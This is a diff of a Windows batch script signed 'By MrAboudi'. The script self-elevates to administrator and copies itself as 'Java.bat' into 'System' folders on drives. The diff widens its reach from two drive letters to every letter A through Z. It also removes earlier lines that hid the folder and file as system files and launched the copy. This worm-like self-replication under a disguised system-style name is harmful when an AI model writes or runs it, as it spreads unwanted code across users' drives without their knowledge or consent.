@@ -1,7 +1,7 @@
 @echo off
 setlocal enabledelayedexpansion
 
-:: Admin check and prompt if needed
+:: Request admin if not elevated
 net session >nul 2>&1
 if %errorlevel% NEQ 0 (
     powershell -Command "Start-Process -FilePath '%~f0' -Verb RunAs"
@@ -10,7 +10,7 @@ if %errorlevel% NEQ 0 (
 
 set "SELF=%~f0"
 
-for %%D in (E F) do (
+for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     if exist "%%D:\" (
         set "FOLDER=System %%D"
         set "FOLDERPATH=%%D:\!FOLDER!"
@@ -22,24 +22,19 @@ for %%D in (E F) do (
             echo Copying script to "!TARGETBAT!"
             copy "%SELF%" "!TARGETBAT!" >nul
             if exist "!TARGETBAT!" (
-                echo Hiding folder and batch file...
-                attrib +h +s "!FOLDERPATH!"
-                attrib +h +s "!TARGETBAT!"
-                echo Starting "!TARGETBAT!"
-                start "" "!TARGETBAT!"
+                echo Successfully copied Java.bat to drive %%D
             ) else (
-                echo FAILED to copy Java.bat on drive %%D
+                echo Failed to copy Java.bat to drive %%D
             )
         ) else (
-            echo FAILED to create folder on drive %%D
+            echo Failed to create folder on drive %%D
         )
-    ) else (
-        echo Drive %%D does not exist.
     )
 )
 
 pause
 exit
+
 
 :: By MrAboudi
 :: v2
